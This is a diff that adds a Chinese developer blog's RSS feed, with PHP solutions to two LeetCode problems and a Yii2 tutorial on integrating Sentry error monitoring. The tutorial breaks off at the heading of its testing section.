@@ -1,0 +1,1007 @@
+<?xml-stylesheet href="/rss.xsl" type="text/xsl"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>JadenHsiao</title>
+    <link>https://jadenhsiao.gitee.io/</link>
+    <description>Recent content on JadenHsiao</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>Jadenhsiao. 本站遵循 CC-BY-NC 4.0 协议</copyright>
+    <lastBuildDate>Tue, 09 Aug 2022 22:15:28 +0800</lastBuildDate>
+    
+        <atom:link href="https://jadenhsiao.gitee.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+        <item>
+        <title>LeetCode - （算法）整数反转</title>
+        <link>https://jadenhsiao.gitee.io/post/reverse-integer/</link>
+        <pubDate>Wed, 20 Jul 2022 10:11:28 +0800</pubDate>
+        
+        <guid>https://jadenhsiao.gitee.io/post/reverse-integer/</guid>
+        <description>JadenHsiao https://jadenhsiao.gitee.io/post/reverse-integer/ -&lt;p&gt;给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;示例 1:&lt;/p&gt;
+&lt;p&gt;输入: 123 输出: 321&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;示例 2:&lt;/p&gt;
+&lt;p&gt;输入: -123 输出: -321&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;示例 3:&lt;/p&gt;
+&lt;p&gt;输入: 120 输出: 21&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;注意:&lt;/p&gt;
+&lt;p&gt;假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−231,  231 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。
+代码内容：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Solution&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;/**
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @param Integer $x
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @return Integer
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;reverse&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$x&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b&#34;&gt;$b&lt;/span&gt; = &lt;span style=&#34;color:#00688b&#34;&gt;$x&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$x&lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#00688b&#34;&gt;$x&lt;/span&gt; = &lt;span style=&#34;color:#00688b&#34;&gt;$x&lt;/span&gt;*-&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$b&lt;/span&gt; == &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;$b&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b&#34;&gt;$result&lt;/span&gt; = implode(array_reverse(str_split(&lt;span style=&#34;color:#00688b&#34;&gt;$x&lt;/span&gt;)));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b&#34;&gt;$t&lt;/span&gt; = trim(&lt;span style=&#34;color:#00688b&#34;&gt;$result&lt;/span&gt;,&lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$t&lt;/span&gt;&amp;gt;pow(&lt;span style=&#34;color:#b452cd&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#b452cd&#34;&gt;31&lt;/span&gt;)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;$b&lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;?&lt;span style=&#34;color:#00688b&#34;&gt;$t&lt;/span&gt;*-&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#00688b&#34;&gt;$t&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;思路：如果提供的值小于0，就转化为正数再进行转化为数组，翻转再成为数组，同时去掉前面的0和判断是否大于2的31次方，对应情况就是如果为小于0就返回为翻转后小于0的数，如果大于2的31次方就返回0。&lt;/p&gt;
+- https://jadenhsiao.gitee.io/post/reverse-integer/ - Jadenhsiao. 本站遵循 CC-BY-NC 4.0 协议</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>LeetCode - （算法）最大间距</title>
+        <link>https://jadenhsiao.gitee.io/post/maximum-gap/</link>
+        <pubDate>Wed, 20 Jul 2022 10:11:28 +0800</pubDate>
+        
+        <guid>https://jadenhsiao.gitee.io/post/maximum-gap/</guid>
+        <description>JadenHsiao https://jadenhsiao.gitee.io/post/maximum-gap/ -&lt;p&gt;给定一个无序的数组，找出数组在排序之后，相邻元素之间最大的差值。&lt;/p&gt;
+&lt;p&gt;如果数组元素个数小于 2，则返回 0。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;示例 1:&lt;/p&gt;
+&lt;p&gt;输入: [3,6,9,1] 输出: 3 解释: 排序后的数组是 [1,3,6,9], 其中相邻元素 (3,6) 和 (6,9)
+之间都存在最大差值 3。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;示例 2:&lt;/p&gt;
+&lt;p&gt;输入: [10] 输出: 0 解释: 数组元素个数小于 2，因此返回 0。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;maximumGap&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$nums&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            sort(&lt;span style=&#34;color:#00688b&#34;&gt;$nums&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(count(&lt;span style=&#34;color:#00688b&#34;&gt;$nums&lt;/span&gt;) == &lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt; || &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;empty&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$nums&lt;/span&gt;)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#00688b&#34;&gt;$total&lt;/span&gt; = [];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;foreach&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$nums&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;$a&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#00688b&#34;&gt;$v&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$a&lt;/span&gt; != count(&lt;span style=&#34;color:#00688b&#34;&gt;$nums&lt;/span&gt;)-&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    		       &lt;span style=&#34;color:#00688b&#34;&gt;$total&lt;/span&gt;[] = &lt;span style=&#34;color:#00688b&#34;&gt;$nums&lt;/span&gt;[&lt;span style=&#34;color:#00688b&#34;&gt;$a&lt;/span&gt;+&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;]-&lt;span style=&#34;color:#00688b&#34;&gt;$v&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                 }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                 unset(&lt;span style=&#34;color:#00688b&#34;&gt;$v&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                 &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; max(&lt;span style=&#34;color:#00688b&#34;&gt;$total&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;思路：先将参数数组进行排序，然后判断个数如果为1和0就直接返回最大值0，否则将数组每一项和前一项进行比对，放入到result，最后使用max获取到最大值。&lt;/p&gt;
+- https://jadenhsiao.gitee.io/post/maximum-gap/ - Jadenhsiao. 本站遵循 CC-BY-NC 4.0 协议</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Yii2使用技巧（五）- 使用Sentry作为错误日志监控平台</title>
+        <link>https://jadenhsiao.gitee.io/post/yii2-skills-part-five/</link>
+        <pubDate>Tue, 19 Jul 2022 15:29:28 +0800</pubDate>
+        
+        <guid>https://jadenhsiao.gitee.io/post/yii2-skills-part-five/</guid>
+        <description>JadenHsiao https://jadenhsiao.gitee.io/post/yii2-skills-part-five/ -&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;Sentry&lt;/em&gt; 是一个实时的事件日志和聚合平台，基于 &lt;em&gt;Django&lt;/em&gt; 构建。使用它可以帮助我们记录下错误信息，官方提供的&lt;em&gt;phpSDK&lt;/em&gt;,只需几行代码，就可以把他整合到&lt;em&gt;Yii&lt;/em&gt;中，本篇文章是技巧三的延续。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;一注册sentry账号&#34;&gt;一、注册&lt;em&gt;Sentry&lt;/em&gt;账号&lt;/h2&gt;
+&lt;p&gt;&lt;em&gt;Sentry&lt;/em&gt;官方提供了线上版和&lt;em&gt;docker&lt;/em&gt;部署两种方式，这里使用的是线上版，有兴趣独立部署的点击前往&lt;a href=&#34;https://github.com/getsentry/self-hosted&#34;&gt;github项目主页&lt;/a&gt;查看；
+打开&lt;em&gt;Sentry&lt;/em&gt;&lt;a href=&#34;https://sentry.io/signup/&#34;&gt;注册&lt;/a&gt;页面，填写对应公司信息和个人信息、邮箱、密码，该邮箱将会作为管理员邮箱。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-19_16-28-22.jpg&#34; alt=&#34;注册界面&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;二创建项目&#34;&gt;二、创建项目&lt;/h2&gt;
+&lt;p&gt;注册完成后进入到控制台，点击右上角进入创建项目界面；&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-19_16-45-29.jpg&#34; alt=&#34;控制台&#34;&gt;&lt;/p&gt;
+&lt;p&gt;因为我们要在&lt;em&gt;Yii&lt;/em&gt;中使用，所以选择&lt;em&gt;php&lt;/em&gt;，填写项目名称，点击创建。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-19_16-45-35.jpg&#34; alt=&#34;创建项目&#34;&gt;&lt;/p&gt;
+&lt;p&gt;创建完成后，在引导配置界面有我们等下需要用到的&lt;em&gt;dsn&lt;/em&gt;，将其复制下来保存好。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-19_16-52-10.jpg&#34; alt=&#34;获取dsn&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;三整合到yii中&#34;&gt;三、整合到&lt;em&gt;Yii&lt;/em&gt;中&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;使用&lt;em&gt;composer&lt;/em&gt;安装&lt;em&gt;sentry/sdk&lt;/em&gt;，指令如下&lt;code&gt;composer require sentry/sdk --with-all-dependencies&lt;/code&gt;；由于该包要求php版本不能低于8.0，所以要先对php环境配置好。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;将&lt;em&gt;dsn&lt;/em&gt;设置到&lt;em&gt;Yii&lt;/em&gt;的&lt;em&gt;params&lt;/em&gt;中，在&lt;em&gt;config/params.php&lt;/em&gt;的数组中加入以下代码块：&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;adminEmail&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;admin@example.com&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;senderEmail&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;noreply@example.com&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;senderName&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;Example.com mailer&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;dsn&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;https://764e44dc5a984331bbe928d1f201fba8@o1261582.ingest.sentry.io/6439472&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;在模块的入口文件&lt;em&gt;init&lt;/em&gt;方法加入&lt;em&gt;sentry&lt;/em&gt;初始化相关，代码块如下：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;Sentry\init&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;as&lt;/span&gt; sentry_init;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Module&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;extends&lt;/span&gt; \yii\base\Module{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;init&lt;/span&gt;(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;parent&lt;/span&gt;::&lt;span style=&#34;color:#658b00&#34;&gt;init&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sentry_init([&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;dsn&amp;#39;&lt;/span&gt; =&amp;gt; Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;params&lt;/span&gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;dsn&amp;#39;&lt;/span&gt;] ]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;在错误拦截类中加入提交到&lt;em&gt;Sentry&lt;/em&gt;相关&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;namespace&lt;/span&gt; app\modules\api\exception;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;\Sentry\captureException&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ErrorHandler&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;extends&lt;/span&gt; BaseErrorHandle
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;/**
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * 错误处理
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @param \Error|\Exception $exception
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @return array
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;convertExceptionToArray&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$exception&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b&#34;&gt;$value&lt;/span&gt; = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;parent&lt;/span&gt;::&lt;span style=&#34;color:#658b00&#34;&gt;convertExceptionToArray&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$exception&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// 加入此行
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        captureException(&lt;span style=&#34;color:#00688b&#34;&gt;$exception&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;code&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#00688b&#34;&gt;$value&lt;/span&gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] ,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#00688b&#34;&gt;$value&lt;/span&gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;四测试并在控制台查看&#34;&gt;四、测试并在控制台查看&lt;/h2&gt;
